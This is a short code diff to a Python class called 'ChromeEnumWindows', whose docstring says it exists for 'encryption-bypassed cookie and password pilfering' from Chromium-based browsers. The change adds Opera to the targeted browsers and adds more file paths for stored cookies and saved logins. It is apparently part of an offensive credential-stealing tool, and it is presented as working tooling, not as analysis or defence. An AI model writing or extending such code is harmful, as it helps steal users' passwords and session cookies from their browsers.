@@ -142,10 +142,13 @@ class ChromeEnumWindows:
     """Enumerates Chrome-based browser data to allow for encryption-bypassed cookie and password pilfering"""
     CHROME_DIRS = [os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\'),
                    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\'),
-                   os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\')]
-    COOKIES_DIRS = ['Default\\Cookies',
+                   os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\'),
+                   os.path.expanduser('~\\AppData\\Roaming\\Opera Software\\Opera Stable\\')]
+    COOKIES_DIRS = ['Network\\Cookies',
+                    'Default\\Cookies',
                     'Default\\Network\\Cookies']
-    PASSWORD_DIRS = ['Default\\Login Data']
+    PASSWORD_DIRS = ['Login Data',
+                     'Default\\Login Data']
 
     def __init__(self):
         self.name = 'Chrome Enum for Windows'
